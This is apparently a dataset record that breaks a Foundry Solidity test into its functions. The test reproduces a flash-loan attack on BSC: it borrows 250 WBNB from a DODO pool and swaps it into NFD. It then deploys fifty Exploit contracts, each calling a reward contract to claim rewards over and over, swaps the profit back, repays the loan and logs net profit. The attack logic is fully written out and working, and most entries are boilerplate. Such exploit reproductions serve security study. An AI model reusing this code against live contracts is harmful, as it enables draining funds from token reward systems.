[
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "DVMFlashLoanCall",
    "original_code": "    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, \"Invalid WBNB amount\");\n        require(quoteAmount == 250 * 1e18, \"Invalid WBNB amount\");\n\n        console.log(\"Swap 250 WBNB to NFD...\");\n        address[] memory path = new address[](3);\n        path[0] = wbnb;\n        path[1] = usdt;\n        path[2] = nfd;\n        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            quoteAmount, 0, path, address(this), block.timestamp\n        );\n\n        emit log_named_decimal_uint(\"[*] NFD balance before attack\", IERC20(nfd).balanceOf(address(this)), 18);\n\n        console.log(\"Abuse the Reward Contract...\");\n        for (uint8 i; i < 50; i++) {\n            Exploit exploit = new Exploit();\n            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));\n            IERC20(nfd).transfer(address(exploit), nfdAmount);\n            exploit.abuse();\n        }\n\n        emit log_named_decimal_uint(\"[*] NFD balance after attack\", IERC20(nfd).balanceOf(address(this)), 18);\n\n        console.log(\"Swap the profit...\");\n        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));\n        path[0] = nfd;\n        path[1] = usdt;\n        path[2] = wbnb;\n        IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            nfdBalance, 0, path, address(this), block.timestamp\n        );\n\n        console.log(\"Repay the flashloan...\");\n        IERC20(wbnb).transfer(msg.sender, 250 * 1e18);\n\n        emit log_named_decimal_uint(\"Attacker's Net Profit\", IERC20(wbnb).balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21_140_434);\n        console.log(\"---------- Reproduce Attack Tx1 ----------\");\n        cheat.label(address(PancakeRouter), \"PancakeRouter\");\n        cheat.label(vulnContract, \"vulnContractName\");\n        cheat.label(wbnb, \"WBNB\");\n        cheat.label(dodo, \"DODO\");\n        cheat.label(usdt, \"USDT\");\n        cheat.label(nfd, \"NFD\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        console.log(\"Flashloan 250 WBNB from DODO DLP...\");\n        bytes memory data = abi.encode(dodo, wbnb, 250 * 1e18);\n        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "abuse",
    "original_code": "    function abuse() external {\n        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));\n        uint256 bal = IERC20(nfd).balanceOf(address(this));\n        require(IERC20(nfd).transfer(msg.sender, bal), \"Transfer profit failed\");\n    }\n",
    "description": ""
  }
]